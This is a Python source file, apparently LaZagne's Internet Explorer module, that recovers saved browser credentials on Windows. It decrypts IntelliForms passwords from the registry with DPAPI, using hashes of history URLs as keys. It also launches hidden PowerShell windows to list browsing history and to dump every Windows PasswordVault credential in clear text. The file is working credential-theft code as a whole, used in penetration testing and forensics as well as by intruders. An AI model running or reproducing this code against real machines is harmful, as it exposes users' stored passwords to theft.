import win32con, win32api, win32cred
import subprocess
import struct, hashlib, os, base64
from ctypes import *
from ctypes.wintypes import DWORD
from lazagne.config.constant import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo

memcpy = cdll.msvcrt.memcpy
LocalFree = windll.kernel32.LocalFree
CryptUnprotectData = windll.crypt32.CryptUnprotectData
CRYPTPROTECT_UI_FORBIDDEN = 0x01
pwdFound = []

class DATA_BLOB(Structure):
	_fields_ = [
		('cbData', DWORD),
		('pbData', POINTER(c_char))
	]

class IE(ModuleInfo):
	def __init__(self):
		options = {'command': '-e', 'action': 'store_true', 'dest': 'Internet Explorer', 'help': 'internet explorer (stored in registry and using the credential manager)'}
		suboptions = [{'command': '-l', 'action': 'store', 'dest': 'historic', 'help': 'text file with a list of websites', 'title': 'Advanced ie option'}]
		ModuleInfo.__init__(self, 'ie', 'browsers', options, suboptions)

	def getData(self, blobOut):
		cbData = int(blobOut.cbData)
		pbData = blobOut.pbData
		buffer = c_buffer(cbData)
		
		memcpy(buffer, pbData, cbData)
		LocalFree(pbData);
		return buffer.raw

	def Win32CryptUnprotectData(self, cipherText, entropy):
		bufferIn = c_buffer(cipherText, len(cipherText))
		blobIn = DATA_BLOB(len(cipherText), bufferIn)
		bufferEntropy = c_buffer(entropy, len(entropy))
		blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)
		blobOut = DATA_BLOB()
		if CryptUnprotectData(byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)):
			return self.getData(blobOut)
		else:
			return 'failed'

	def get_hash_table(self, lists):
		# get the url list
		urls = self.get_history()
		urls = urls + lists
		
		# calculate the hash for all urls found on the history
		hash_tables = []
		for u in range(len(urls)):
			try:
				h = (urls[u] + '\0').encode('UTF-16LE')
				hash_tables.append([h, hashlib.sha1(h).hexdigest().lower()])
			except Exception,e:
				print_debug('DEBUG', '{0}'.format(e))
		return hash_tables

	def get_history(self):
		urls = self.history_from_regedit()
		try:
			urls = urls + self.history_from_powershell()
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			print_debug('ERROR', 'Browser history failed to load, only few url will be tried')
		
		urls = urls + ['https://www.facebook.com/', 'https://www.gmail.com/', 'https://accounts.google.com/', 'https://accounts.google.com/servicelogin']
		return urls
	
	def history_from_powershell(self):
		# From https://richardspowershellblog.wordpress.com/2011/06/29/ie-history-to-csv/
		cmdline = '''
		function get-iehistory {            
		[CmdletBinding()]            
		param ()            
		            
		$shell = New-Object -ComObject Shell.Application            
		$hist = $shell.NameSpace(34)            
		$folder = $hist.Self            
		            
		$hist.Items() |             
		foreach {            
		 if ($_.IsFolder) {            
		   $siteFolder = $_.GetFolder            
		   $siteFolder.Items() |             
		   foreach {            
		     $site = $_            
		             
		     if ($site.IsFolder) {            
		        $pageFolder  = $site.GetFolder            
		        $pageFolder.Items() |             
		        foreach {            
		           $visit = New-Object -TypeName PSObject -Property @{                    
		               URL = $($pageFolder.GetDetailsOf($_,0))                       
		           }            
		           $visit            
		        }            
		     }            
		   }            
		 }            
		}            
		}
		get-iehistory
		'''
		command=['powershell.exe', '/c', cmdline]

		info=subprocess.STARTUPINFO()
		info.dwFlags=subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
		info.wShowWindow=subprocess.SW_HIDE
		p=subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
		res, _=p.communicate()
		urls = []
		for r in res.split('\n'):
			if r.startswith('http'):
				urls.append(r.strip())
		return urls 

	def history_from_regedit(self):
		urls = []
		
		# open the registry
		accessRead = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
		keyPath = 'Software\\Microsoft\\Internet Explorer\\TypedURLs'
		
		try:
			hkey = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, keyPath, 0, accessRead)
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			return []
		
		num = win32api.RegQueryInfoKey(hkey)[1]
		for x in range(0, num):
			k = win32api.RegEnumValue(hkey, x)
			if k:
				urls.append(k[1])
		return urls
		
	def decipher_password(self, cipher_text, u):
		pfound = []
		# deciper the password
		pwd = self.Win32CryptUnprotectData(cipher_text, u)
		a = None
		for i in range(len(pwd)):
			try:
				a = pwd[i:].decode('UTF-16LE')
				a = a.decode('utf-8')
				break
			except Exception,e:
				pass
				result = ''
		
		# the last one is always equal to 0
		secret = a.split('\x00')
		if secret[len(secret)-1] == '':
			secret = secret[:len(secret)-1]

		# define the length of the tab
		if len(secret) % 2 == 0:
			length = len(secret)
		else: 
			length = len(secret)-1

		values = {}
		# list username / password in clear text
		for s in range(length):
			try:
				if s % 2 != 0:
					values = {}
					values['Website'] = u.decode('UTF-16LE')
					values['Username'] = secret[length - s]
					values['Password'] = password
					pfound.append(values)
				else:
					password = secret[length - s]
			except Exception,e:
				print_debug('DEBUG', '{0}'.format(e))

		return pfound
	
	# get credential manager passwords
	def windows_vault_ie(self):
		# From :  https://gallery.technet.microsoft.com/Manipulate-credentials-in-58e0f761
		cmdline = '''
		try
		{
			#Load the WinRT projection for the PasswordVault
			$Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
			$Script:vault	  = new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
		}
		catch
		{
			throw "This module relies on functionality provided in Windows 8 or Windows 2012 and above."
		}
		#endregion

		function Get-VaultCredential
		{
			process
			{
				try
				{
					&{
						$Script:vault.RetrieveAll()
					} | foreach-Object {  $_.RetrievePassword() ; "Username......";$_.UserName;"######";"Password......";$_.Password;"######";"Website......";$_.Resource;"_________" }
				}
				catch
				{
					Write-Error -ErrorRecord $_ -RecommendedAction "Check your search input - user: $UserName resource: $Resource"
				}
			}
			end
			{
				Write-Debug "[$cmdName] Exiting function"
			}
		}
		Get-VaultCredential
		'''

		command=['powershell.exe', '/c', cmdline]

		info=subprocess.STARTUPINFO()
		info.dwFlags=subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
		info.wShowWindow=subprocess.SW_HIDE
		p=subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
		results, _=p.communicate()

		passwords = []
		for result in results.replace('\n', '').split('_________'):
			values = {}
			if result:
				for res in result.split('######'):
					values[res.split('......')[0]] = res.split('......')[1]
				passwords.append(values)
		return passwords

	def run(self, historic=''):
		pwdFound = []
		
		# ----------------- For Win7 and before (passwords stored on registry) -----------------
		# open the registry
		accessRead = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
		keyPath = 'Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'
		
		failed = False
		try:
			hkey = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, keyPath, 0, accessRead)
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			failed = True
		
		if failed == False:
			nb_site = 0
			nb_pass_found = 0 
			lists = []
			if historic:
				if os.path.exists(historic):
					f = open(historic, 'r')
					for line in f:
						lists.append(line.strip())
				else:
					print_debug('WARNING', 'The text file %s does not exist' % historic)
			
			# retrieve the urls from the history
			hash_tables = self.get_hash_table(lists)
			
			num = win32api.RegQueryInfoKey(hkey)[1]
			for x in range(0, num):
				k = win32api.RegEnumValue(hkey, x)
				if k:
					nb_site +=1
					for h in hash_tables:
						# both hash are similar, we can decipher the password
						if h[1] == k[0][:40].lower():
							nb_pass_found += 1
							cipher_text = k[1]
							pwdFound += self.decipher_password(cipher_text, h[0])
							break
				
				# manage errors
				if nb_site > nb_pass_found:
					print_debug('ERROR', '%s hashes have not been decrypted, the associate website used to decrypt the passwords has not been found' % str(nb_site - nb_pass_found))
		
		# ----------------- For Win8 and after (passwords stored on the credential manager) -----------------
		try:
			pwdFound += self.windows_vault_ie()
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))

		return pwdFound
